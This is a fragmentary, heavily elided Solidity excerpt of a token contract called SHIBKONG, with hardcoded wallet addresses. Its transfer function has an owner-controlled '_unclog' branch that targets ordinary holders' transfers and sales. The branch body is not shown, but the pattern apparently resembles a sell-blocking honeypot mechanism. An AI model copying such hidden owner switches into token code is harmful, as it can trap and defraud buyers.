...
contract SHIBKONG is Context, IERC20, ERC20Ownable {
    ...
    bool private _unclog = false;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;

    string private constant _name = "SHIBKONG";
    string private constant _symbol = "SHIBKONG";
    ...
    constructor() payable {
        ...
        MarketingWallet = payable(0x6Bc4F2958333d249eb7aFD508141586D0D30e6Fb);
        DevWallet = payable(0xA1D43B6216F0A85E658FD3c0D4431D781f040469);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_unclog == true && to != owner() && from != uniV2Pair) {
    ...
    function UnClogReset() external onlyOwner {
        _unclog = false;
    }
